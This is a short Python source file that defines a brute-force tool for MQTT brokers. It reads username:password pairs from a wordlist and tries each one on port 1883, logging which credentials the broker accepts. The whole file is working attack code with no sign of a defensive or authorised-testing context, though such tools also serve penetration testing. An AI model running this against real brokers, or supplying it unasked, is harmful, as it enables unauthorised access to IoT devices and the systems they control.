import paho.mqtt.client as mqtt
import os

class BruteForcer:
    def __init__(self, wordlist_path="assets/wordlist.txt", logger=None):
        self.wordlist_path = wordlist_path
        self.logger = logger
        self.found_credential = None

    def log(self, message):
        if self.logger:
            self.logger(message)

    def brute_force(self, broker_ip):
        if not os.path.exists(self.wordlist_path):
            self.log("Wordlist tidak ditemukan!")
            return None

        with open(self.wordlist_path, encoding='utf-8', errors='ignore') as f:
            creds = [line.strip().split(":") for line in f if ":" in line]

        for username, password in creds:
            success = {"ok": False}

            def on_connect(client, userdata, flags, rc):
                success["ok"] = (rc == 0)

            client = mqtt.Client()
            client.username_pw_set(username, password)
            client.on_connect = on_connect

            try:
                client.connect(broker_ip, 1883, 5)
                client.loop_start()
                import time
                time.sleep(2)
                client.loop_stop()
                client.disconnect()

                if success["ok"]:
                    self.found_credential = (username, password)
                    self.log(f"[✓] Valid credentials: {username}:{password}")
                    return self.found_credential
                else:
                    self.log(f"[-] Invalid: {username}:{password}")
            except Exception:
                continue

        return None
